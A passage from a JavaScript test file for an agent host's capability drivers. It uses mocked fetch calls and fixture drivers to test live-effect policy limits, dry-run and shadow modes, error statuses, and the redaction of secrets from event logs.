          store: new MemoryStore(),
          runId: 'model-live-invalid-run',
          branchId: 'main',
          parentTurnClosureFingerprint: 'world:turn-closure:parent',
        },
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          maximumLiveModelCalls: 1,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      });
      assert.equal(decodeResolutionInputBytes(invalidLiveModel.resolutionInputBytes).status, 2);
      assert.equal(invalidLiveModel.record.state, 'resolved');
      assert.equal(invalidLiveFetchCount, 1);

      let malformedPromptFetchCalled = false;
      globalThis.fetch = async () => {
        malformedPromptFetchCalled = true;
        return new Response('{"action":{"variant":"final","text":"ok"}}', { status: 200 });
      };
      await assert.rejects(
        () => driver.resolve({
          policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'], allowedMethods: ['POST'] },
        }, { ...genericHttpModelRequest('goal=invoke', 'model-http-key-bad-prompt'), requestBytes: fromUtf8(stableJson({ schema: 'wrong', observation: 'goal=invoke' })) }),
        { code: 'ERR_AGENT_DECISION_PROMPT_SCHEMA' },
      );
      assert.equal(malformedPromptFetchCalled, false);

      globalThis.fetch = async () => new Response('transport failed', { status: 500 });
      const failed = await driver.resolve({
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          maximumLiveModelCalls: 1,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      }, { ...genericHttpModelRequest('goal=invoke', 'model-http-key-failed'), responseSchema: { status: 'http_error' } });
      const failedResolution = decodeResolutionInputBytes(failed.resolutionInputBytes);
      const failedMetadata = JSON.parse(new TextDecoder().decode(failedResolution.metadata));
      assert.equal(failedResolution.status, 1);
      assert.equal(failedResolution.responseValueImageBytes.byteLength, 0);
      assert.equal(failedMetadata.driver, 'generic-http-json-model');
      assert.equal(failedMetadata.status, 'http_error');
      assert.equal(failedMetadata.transportStatus, 'http_error');

      globalThis.fetch = async () => new Response('transport failed', { status: 500 });
      const failedSchema = await driver.resolve({
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          maximumLiveModelCalls: 1,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      }, { ...genericHttpModelRequest('goal=invoke', 'model-http-key-failed-schema'), responseSchema: { status: 'failed' } });
      const failedSchemaResolution = decodeResolutionInputBytes(failedSchema.resolutionInputBytes);
      const failedSchemaMetadata = JSON.parse(new TextDecoder().decode(failedSchemaResolution.metadata));
      assert.equal(failedSchemaResolution.status, 2);
      assert.equal(failedSchemaMetadata.status, 'failed');
      assert.equal(failedSchemaMetadata.transportStatus, 'http_error');

      let failedLiveFetchCount = 0;
      globalThis.fetch = async () => {
        failedLiveFetchCount += 1;
        return new Response('transport failed', { status: 500 });
      };
      const failedLive = await runCapabilityMode({
        mode: 'live',
        driver,
        hostRequest: { ...genericHttpModelRequest('goal=invoke', 'model-live-failed-key'), responseSchema: { status: 'http_error' } },
        journalOptions: {
          store: new MemoryStore(),
          runId: 'model-live-failed-run',
          branchId: 'main',
          parentTurnClosureFingerprint: 'world:turn-closure:parent',
        },
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          maximumLiveModelCalls: 1,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      });
      assert.equal(decodeResolutionInputBytes(failedLive.resolutionInputBytes).status, 1);
      assert.equal(failedLiveFetchCount, 1);

      let failedSchemaLiveFetchCount = 0;
      globalThis.fetch = async () => {
        failedSchemaLiveFetchCount += 1;
        return new Response('transport failed', { status: 500 });
      };
      const failedSchemaLive = await runCapabilityMode({
        mode: 'live',
        driver,
        hostRequest: { ...genericHttpModelRequest('goal=invoke', 'model-live-failed-schema-key'), responseSchema: { status: 'failed' } },
        journalOptions: {
          store: new MemoryStore(),
          runId: 'model-live-failed-schema-run',
          branchId: 'main',
          parentTurnClosureFingerprint: 'world:turn-closure:parent',
        },
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          maximumLiveModelCalls: 1,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      });
      assert.equal(decodeResolutionInputBytes(failedSchemaLive.resolutionInputBytes).status, 2);
      assert.equal(failedSchemaLive.record.state, 'resolved');
      assert.equal(failedSchemaLiveFetchCount, 1);
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('emits operational-only observability JSONL without secrets', () => {
    const stream = new HostEventStream();
    const event = stream.emit(HostEventType.capabilityPackLoaded, {
      driverId: 'fixture',
      apiKey: 'secret',
      type: HostEventType.runFailed,
      at: 'caller-clock',
      worldAuthoredEvidence: true,
    });
    assert.equal(event.type, HostEventType.capabilityPackLoaded);
    assert.equal(event.at === 'caller-clock', false);
    assert.equal(event.worldAuthoredEvidence, false);
    stream.emit(HostEventType.runCompleted, { worldFingerprint: 'world:turn-closure:1' });
    const jsonl = stream.toJsonl();
    assert.equal(jsonl.includes('secret'), false);
    assert.equal(stream.summary().worldAuthoredEvidence, false);
    assert.equal(stream.summary().counts.capability_pack_loaded, 1);
  });
});

function preflightBlockedDriver() {
  let resolveCalled = false;
  return {
    get resolveCalled() {
      return resolveCalled;
    },
    manifest() {
      return {
        driverId: 'preflight-blocked-http',
        supportedActuatorRefs: ['http:json'],
        supportedDescriptorFingerprints: ['descriptor:http-json'],
        supportedActuationClasses: ['http'],
        supportedResponseStatuses: ['ok'],
        maximumRequestBytes: 1024,
        maximumResponseBytes: 1024,
        recoveryClass: EffectRecoveryClass.idempotent,
        concurrencyLimit: 1,
        authorityLabels: ['network:http'],
      };
    },
    preflight() {
      return { accepted: false, blockers: ['driver-specific-blocker'] };
    },
    dryRun() {
      return { wouldInvoke: true, proposedAction: { driver: 'preflight-blocked-http' } };
    },
    shadow() {
      return { liveInvoked: false, schemaAccepted: false };
    },
    async resolve() {
      resolveCalled = true;
      const error = new Error('preflight bypassed');
      error.code = 'ERR_PREFLIGHT_BYPASS_EFFECT';
      throw error;
    },
  };
}

function deterministicLiveEffectDriver(onResolve, { authorityLabels = ['network:http'], driverId = 'deterministic-live-effect' } = {}) {
  return {
    manifest() {
      return {
        driverId,
        supportedActuatorRefs: ['http:json'],
        supportedDescriptorFingerprints: ['descriptor:http-json'],
        supportedActuationClasses: ['http'],
        supportedResponseStatuses: ['ok'],
        maximumRequestBytes: 1024,
        maximumResponseBytes: 1024,
        recoveryClass: EffectRecoveryClass.idempotent,
        concurrencyLimit: 1,
        authorityLabels,
        diagnostics: { deterministic: true },
      };
    },
    preflight() {
      return { accepted: true };
    },
    dryRun() {
      return { wouldInvoke: true, proposedAction: { driver: 'deterministic-live-effect' } };
    },
    shadow() {
      return { liveInvoked: false, schemaAccepted: false };
    },
    async resolve() {
      onResolve();
      const error = new Error('fixture live effect should not resolve');
      error.code = 'ERR_FIXTURE_LIVE_EFFECT_RESOLVED';
      throw error;
    },
  };
}

function deterministicModelLiveEffectDriver(onResolve, { authorityLabels = ['model:http-json'], driverId = 'fixture-agent-model' } = {}) {
  return {
    manifest() {
      return {
        driverId,
        supportedActuatorRefs: ['model:decision'],
        supportedDescriptorFingerprints: ['descriptor:agent-decision-prompt'],
        supportedActuationClasses: ['model'],
        supportedResponseStatuses: ['ok'],
        maximumRequestBytes: 1024 * 1024,
        maximumResponseBytes: 1024 * 1024,
        recoveryClass: EffectRecoveryClass.idempotent,
        concurrencyLimit: 1,
        authorityLabels,
        diagnostics: { deterministic: true },
      };
    },
    preflight() {
      return { accepted: true };
    },
    dryRun() {
      return { wouldInvoke: true, proposedAction: { driver: 'deterministic-model-live-effect' } };
    },
    shadow() {
      return { liveInvoked: true, schemaAccepted: false };
    },
    async resolve() {
      onResolve();
      const error = new Error('fixture live model effect should not resolve');
      error.code = 'ERR_FIXTURE_MODEL_LIVE_EFFECT_RESOLVED';
      throw error;
    },
  };
}

function worldEvidenceReportDriver({ preflightReport = { accepted: true }, dryRunReport = { wouldInvoke: false }, shadowReport = { liveInvoked: false, schemaAccepted: false } } = {}) {
  const delegate = new FixtureAgentModelCapabilityDriver();
  return {
    manifest: () => delegate.manifest(),
    preflight: () => preflightReport,
    dryRun: () => dryRunReport,
    shadow: () => shadowReport,
    resolve: delegate.resolve.bind(delegate),
  };
}

function wrongTargetFixtureDriver() {
  const delegate = new FixtureAgentModelCapabilityDriver();
  return {
    manifest: () => delegate.manifest(),
    preflight: () => ({ accepted: true }),
    dryRun: delegate.dryRun.bind(delegate),
    shadow: delegate.shadow.bind(delegate),
    async resolve() {
      return {
        resolutionInputBytes: encodeResolutionInputBytes({
          targetHostRequestFingerprint: 0x9999n,
          status: 0,
          responseValueImageBytes: fromUtf8('wrong-target'),
          hostClaimBytes: fromUtf8('{}'),
          attemptNumber: 1,
        }),
      };
    },
  };
}

function hostFieldOverrideFixtureDriver() {
  const delegate = new FixtureAgentModelCapabilityDriver();
  return {
    manifest: () => delegate.manifest(),
    preflight: () => ({ accepted: true }),
    dryRun: delegate.dryRun.bind(delegate),
    shadow: delegate.shadow.bind(delegate),
    async resolve(context, hostRequest) {
      return {
        ...await delegate.resolve(context, hostRequest),
        mode: 'driver-mode',
        submittedToWorld: false,
        approved: false,
        proposed: { wouldInvoke: true },
      };
    },
  };
}

function bestEffortModelDriver() {
  let resolveCalled = false;
  return {
    get resolveCalled() {
      return resolveCalled;
    },
    manifest() {
      return {
        driverId: 'best-effort-model',
        supportedActuatorRefs: ['fixture:agent-model'],
        supportedDescriptorFingerprints: ['descriptor:fixture-agent-model'],
        supportedActuationClasses: ['model'],
        supportedResponseStatuses: ['ok'],
        maximumRequestBytes: 1024,
        maximumResponseBytes: 1024,
        recoveryClass: EffectRecoveryClass.bestEffort,
        concurrencyLimit: 1,
        authorityLabels: ['model:fixture-agent'],
      };
    },
    preflight() {
      return { accepted: true };
    },
    dryRun() {
      return { wouldInvoke: false, proposedAction: { driver: 'best-effort-model' } };
    },
    shadow() {
      return { liveInvoked: false, schemaAccepted: false };
    },
    async resolve() {
      resolveCalled = true;
      const error = new Error('parked best-effort effect should not resolve');
      error.code = 'ERR_PARKED_BEST_EFFORT_RESOLVED';
      throw error;
    },
  };
}

function policyProbeDriver({ packFingerprint } = {}) {
  let resolveCalled = false;
  let shadowCalled = false;
  let dryRunCalled = false;
  return {
    get resolveCalled() {
      return resolveCalled;
    },
    get shadowCalled() {
      return shadowCalled;
    },
    get dryRunCalled() {
      return dryRunCalled;
    },
    manifest() {
      return {
        driverId: 'policy-probe-http',
        packFingerprint,
        supportedActuatorRefs: ['http:json'],
        supportedDescriptorFingerprints: ['descriptor:http-json'],
        supportedActuationClasses: ['http'],
        supportedResponseStatuses: ['ok'],
        maximumRequestBytes: 1024,
        maximumResponseBytes: 1024,
        recoveryClass: EffectRecoveryClass.idempotent,
        concurrencyLimit: 1,
        authorityLabels: ['network:http'],
      };
    },
    preflight() {
      return { accepted: true };
    },
    dryRun() {
      dryRunCalled = true;
      return { wouldInvoke: true, proposedAction: { driver: 'policy-probe-http' } };
    },
    shadow() {
      shadowCalled = true;
      return { liveInvoked: true, schemaAccepted: false };
    },
    async resolve() {
      resolveCalled = true;
      const error = new Error('policy bypassed');
      error.code = 'ERR_POLICY_BYPASS_EFFECT';
      throw error;
    },
  };
}

function localPolicyProbeDriver({ packFingerprint } = {}) {
  let shadowCalled = false;
  let resolveCalled = false;
  return {
    get shadowCalled() {
      return shadowCalled;
    },
    get resolveCalled() {
      return resolveCalled;
    },
    manifest() {
      return {
        driverId: 'fixture-agent-model',
        packFingerprint,
        supportedActuatorRefs: ['fixture:agent-model'],
        supportedDescriptorFingerprints: ['descriptor:fixture-agent-model'],
        supportedActuationClasses: ['model'],
        supportedResponseStatuses: ['ok'],
        maximumRequestBytes: 1024,
        maximumResponseBytes: 1024,
        recoveryClass: EffectRecoveryClass.idempotent,
        concurrencyLimit: 1,
        authorityLabels: ['model:fixture-agent'],
        diagnostics: { deterministic: true },
      };
    },
    preflight() {
      return { accepted: true };
    },
    dryRun() {
      return { wouldInvoke: false, proposedAction: { driver: 'local-policy-probe' } };
    },
    shadow() {
      shadowCalled = true;
      return { liveInvoked: false, schemaAccepted: false };
    },
    async resolve() {
      resolveCalled = true;
      const error = new Error('local policy bypassed');
      error.code = 'ERR_LOCAL_POLICY_BYPASS_EFFECT';
      throw error;
    },
  };
}

async function runBunProcess(command, options = {}) {
  const subprocess = Bun.spawn(command, { ...options, stdout: 'pipe', stderr: 'pipe' });
  const [code, stdout, stderr] = await Promise.all([
    subprocess.exited,
    new Response(subprocess.stdout).text(),
    new Response(subprocess.stderr).text(),
  ]);
  return { code, stdout, stderr };
}

function modelShadowProbeDriver({ authorityLabels = ['model:openai'] } = {}) {
  let shadowCalled = false;
  return {
    get shadowCalled() {
      return shadowCalled;
    },
    manifest() {
      return {
        driverId: 'policy-probe-model',
        supportedActuatorRefs: ['model:decision'],
        supportedDescriptorFingerprints: ['descriptor:agent-decision-prompt'],
        supportedActuationClasses: ['model'],
        supportedResponseStatuses: ['ok', 'failed', 'deferred'],
        maximumRequestBytes: 1024 * 1024,
        maximumResponseBytes: 1024 * 1024,
        recoveryClass: EffectRecoveryClass.idempotent,
        concurrencyLimit: 1,
        authorityLabels,
      };
    },
    preflight() {
      return { accepted: true };
    },
    dryRun() {
      return { wouldInvoke: true, proposedAction: { driver: 'policy-probe-model' } };
    },
    shadow() {
      shadowCalled = true;
      return { liveInvoked: true, schemaAccepted: false };
    },
    async resolve() {
      const error = new Error('model probe should not resolve');
      error.code = 'ERR_MODEL_PROBE_RESOLVED';
      throw error;
    },
  };
}

function fixtureCapabilityManifest() {
  return {
    formatVersion: world_host_capability_pack_format_version,
    packageName: 'world-capability-fixture',
    packageVersion: '0.2.0',
    driverId: 'fixture-agent-model',
    driverAbiVersion: world_host_capability_driver_abi_version,
    supportedWorldProtocolVersion: 'v0.1.0',
    supportedApplianceAbiVersion: 'v4',
    supportedTurnClosureVersion: 'v1',
    supportedActuatorRefs: ['fixture:agent-model'],
    supportedDescriptorFingerprints: ['descriptor:fixture-agent-model'],
    supportedActuationClasses: ['model'],
    supportedResponseStatuses: ['ok', 'final'],
    recoveryClass: EffectRecoveryClass.pure,
    canDryRun: true,
    canShadow: true,
    canReplay: true,
    canRecover: true,
    propagatesWorldIdempotencyKey: true,
    requiresApproval: false,
    requiredSecrets: [],
    authorityLabels: ['model:fixture-agent'],
    policyRequirements: {},
    maximumRequestBytes: 1024,
    maximumResponseBytes: 1024,
    conformanceCorpusFingerprint: null,
    metadataBytes: '',
    adapter: { kind: 'in_process', module: 'adapter.mjs', exportName: 'driver' },
    checksums: [],
    docs: ['README.md'],
  };
}

function modelRequest(observation, key) {
  return {
    hostRequestFingerprint: 'world:host-request:00000000000000a1',
    idempotencyKeyBytes: fromUtf8(key),
    idempotencyKeyWorldFingerprint: `world:key:${key}`,
    actuatorRef: 'fixture:agent-model',
    descriptorFingerprint: 'descriptor:fixture-agent-model',
    actuationClass: 'model',
    responseSchema: { status: 'ok' },
    requestBytes: fromUtf8(stableJson({ schema: 'boundary.Agent.DecisionPrompt.v0', observation })),
  };
}

function genericHttpModelRequest(observation, key) {
  return {
    ...modelRequest(observation, key),
    actuatorRef: 'model:decision',
    descriptorFingerprint: 'descriptor:agent-decision-prompt',
  };
}

function httpRequest() {
  return {
    hostRequestFingerprint: 'world:host-request:00000000000000a2',
    idempotencyKeyBytes: fromUtf8('http-key'),
    idempotencyKeyWorldFingerprint: 'world:key:http',
    actuatorRef: 'http:json',
    descriptorFingerprint: 'descriptor:http-json',
    actuationClass: 'http',
    responseSchema: { status: 'ok' },
    requestBytes: fromUtf8(stableJson({ url: 'https://allowed.example/decide', method: 'POST', body: { prompt: 'hi' } })),
  };
}

function fileRequest() {
  return {
    hostRequestFingerprint: 'world:host-request:00000000000000a4',
    idempotencyKeyBytes: fromUtf8('file-key'),
    idempotencyKeyWorldFingerprint: 'world:key:file',
    actuatorRef: 'sandbox:file',
    descriptorFingerprint: 'descriptor:sandbox-file',
    actuationClass: 'file',
    responseSchema: { status: 'ok' },
    requestBytes: fromUtf8(stableJson({ path: 'out.txt', operation: 'write', content: 'dry-run' })),
  };
}

function dryRunFileProbeDriver(root) {
  let dryRunCalled = false;
  return {
    get dryRunCalled() {
      return dryRunCalled;
    },
    manifest() {
      return {
        driverId: 'dry-run-file-probe',
        supportedActuatorRefs: ['sandbox:file'],
        supportedDescriptorFingerprints: ['descriptor:sandbox-file'],
        supportedActuationClasses: ['file'],
        supportedResponseStatuses: ['ok'],
        maximumRequestBytes: 1024,
        maximumResponseBytes: 1024,
        recoveryClass: EffectRecoveryClass.idempotent,
        concurrencyLimit: 1,
        authorityLabels: ['file:sandbox'],
        diagnostics: { root },
      };
    },
    preflight() {
      return { accepted: true };
    },
    dryRun(_context, hostRequest) {
      dryRunCalled = true;
      const request = JSON.parse(new TextDecoder().decode(hostRequest.requestBytes));
      return { wouldInvoke: true, proposedAction: request };
    },
    shadow() {
      return { liveInvoked: false, schemaAccepted: false };
    },
    async resolve() {
      throw Object.assign(new Error('dry-run file probe must not resolve'), { code: 'ERR_DRY_RUN_FILE_PROBE_RESOLVED' });
    },
  };
}

function approvalRequest() {
  return {
    hostRequestFingerprint: 'world:host-request:00000000000000a3',
    idempotencyKeyBytes: fromUtf8('approval-key'),
    idempotencyKeyWorldFingerprint: 'world:key:approval',
    actuatorRef: 'human:approval',
    descriptorFingerprint: 'descriptor:human-approval',
    actuationClass: 'human',
    responseSchema: { status: 'ok' },
    requestBytes: fromUtf8(stableJson({ action: 'approve-file-write', secret: '[redacted]' })),
  };
}

async function sha256Hex(bytes) {
  const digest = await globalThis.crypto.subtle.digest('SHA-256', bytes);
  return toHex(new Uint8Array(digest));
}
